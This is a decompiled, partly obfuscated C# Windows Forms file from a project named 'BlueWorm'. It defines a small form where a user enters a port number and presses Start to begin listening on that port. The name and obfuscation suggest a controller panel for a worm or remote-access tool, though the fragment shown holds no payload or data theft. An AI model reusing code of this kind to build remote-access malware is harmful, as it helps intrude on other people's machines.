using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace BlueWorm
{
	// Token: 0x02000014 RID: 20
	[DesignerGenerated]
	public partial class Form7 : Form
	{
		// Token: 0x0600011C RID: 284 RVA: 0x0000284F File Offset: 0x00000A4F
		// Note: this type is marked as 'beforefieldinit'.
		[DebuggerNonUserCode]
		static Form7()
		{
			Class9.jBg04XuzOGhUk();
			Form7.list_0 = new List<WeakReference>();
		}

		// Token: 0x0600011D RID: 285 RVA: 0x00002860 File Offset: 0x00000A60
		[DebuggerNonUserCode]
		public Form7()
		{
			Class9.jBg04XuzOGhUk();
			base..ctor();
			base.Load += this.Form7_Load;
			Form7.smethod_0(this);
			this.InitializeComponent();
		}

		// Token: 0x0600011E RID: 286 RVA: 0x00009244 File Offset: 0x00007444
		[DebuggerNonUserCode]
		private static void smethod_0(object object_1)
		{
			List<WeakReference> obj = Form7.list_0;
			checked
			{
				lock (obj)
				{
					if (Form7.list_0.Count == Form7.list_0.Capacity)
					{
						int num = 0;
						int num2 = 0;
						int num3 = Form7.list_0.Count - 1;
						int num4 = num2;
						for (;;)
						{
							int num5 = num4;
							int num6 = num3;
							if (num5 > num6)
							{
								break;
							}
							WeakReference weakReference = Form7.list_0[num4];
							if (weakReference.IsAlive)
							{
								if (num4 != num)
								{
									Form7.list_0[num] = Form7.list_0[num4];
								}
								num++;
							}
							num4++;
						}
						Form7.list_0.RemoveRange(num, Form7.list_0.Count - num);
						Form7.list_0.Capacity = Form7.list_0.Count;
					}
					Form7.list_0.Add(new WeakReference(RuntimeHelpers.GetObjectValue(object_1)));
				}
			}
		}

		// Token: 0x1700003F RID: 63
		// (get) Token: 0x06000121 RID: 289 RVA: 0x000095C0 File Offset: 0x000077C0
		// (set) Token: 0x06000122 RID: 290 RVA: 0x000095D8 File Offset: 0x000077D8
		internal virtual TextBox TextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.TextBox1_TextChanged);
				if (this._TextBox1 != null)
				{
					this._TextBox1.TextChanged -= value2;
				}
				this._TextBox1 = value;
				if (this._TextBox1 != null)
				{
					this._TextBox1.TextChanged += value2;
				}
			}
		}

		// Token: 0x17000040 RID: 64
		// (get) Token: 0x06000123 RID: 291 RVA: 0x00009630 File Offset: 0x00007830
		// (set) Token: 0x06000124 RID: 292 RVA: 0x00009648 File Offset: 0x00007848
		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				if (this._Button1 != null)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				if (this._Button1 != null)
				{
					this._Button1.Click += value2;
				}
			}
		}

		// Token: 0x17000041 RID: 65
		// (get) Token: 0x06000125 RID: 293 RVA: 0x000096A0 File Offset: 0x000078A0
		// (set) Token: 0x06000126 RID: 294 RVA: 0x000096B8 File Offset: 0x000078B8
		internal virtual Label Label1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Label1_Click);
				if (this._Label1 != null)
				{
					this._Label1.Click -= value2;
				}
				this._Label1 = value;
				if (this._Label1 != null)
				{
					this._Label1.Click += value2;
				}
			}
		}

		// Token: 0x06000127 RID: 295 RVA: 0x00009710 File Offset: 0x00007910
		private void Button1_Click(object sender, EventArgs e)
		{
			if (Operators.CompareString(this.Button1.Text, "Start", false) == 0)
			{
				this.Button1.Text = "Stop";
				this.Button1.Enabled = false;
			}
			else
			{
				this.Button1.Text = "Start";
			}
			if (!Versioned.IsNumeric(this.TextBox1.Text))
			{
				Interaction.MsgBox("please Enter Port Listen", MsgBoxStyle.OkOnly, null);
			}
			else
			{
				this.search();
				if (this.bool_0)
				{
					Interaction.MsgBox("Cannot Add Port", MsgBoxStyle.OkOnly, null);
				}
				else
				{
					this.listen();
				}
			}
		}

		// Token: 0x06000128 RID: 296 RVA: 0x000097B0 File Offset: 0x000079B0
		public void listen()
		{
			try
			{
				this.object_0 = int.Parse(this.TextBox1.Text);
				Class2.umavbhbSM.Form2.port = int.Parse(Conversions.ToString(this.object_0));
				Class2.umavbhbSM.Form2.listen();
			}
			catch (Exception ex)
			{
				Interaction.MsgBox(ex.Message, MsgBoxStyle.OkOnly, null);
			}
		}

		// Token: 0x06000129 RID: 297 RVA: 0x000025ED File Offset: 0x000007ED
		public void search()
		{
		}

		// Token: 0x0600012A RID: 298 RVA: 0x000025ED File Offset: 0x000007ED
		private void Form7_Load(object sender, EventArgs e)
		{
		}

		// Token: 0x0600012B RID: 299 RVA: 0x000025ED File Offset: 0x000007ED
		private void Label1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600012C RID: 300 RVA: 0x000025ED File Offset: 0x000007ED
		private void TextBox1_TextChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x04000074 RID: 116
		private static List<WeakReference> list_0;

		// Token: 0x04000076 RID: 118
		[AccessedThroughProperty("TextBox1")]
		private TextBox _TextBox1;

		// Token: 0x04000077 RID: 119
		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		// Token: 0x04000078 RID: 120
		[AccessedThroughProperty("Label1")]
		private Label _Label1;

		// Token: 0x04000079 RID: 121
		private object object_0;

		// Token: 0x0400007A RID: 122
		private bool bool_0;
	}
}
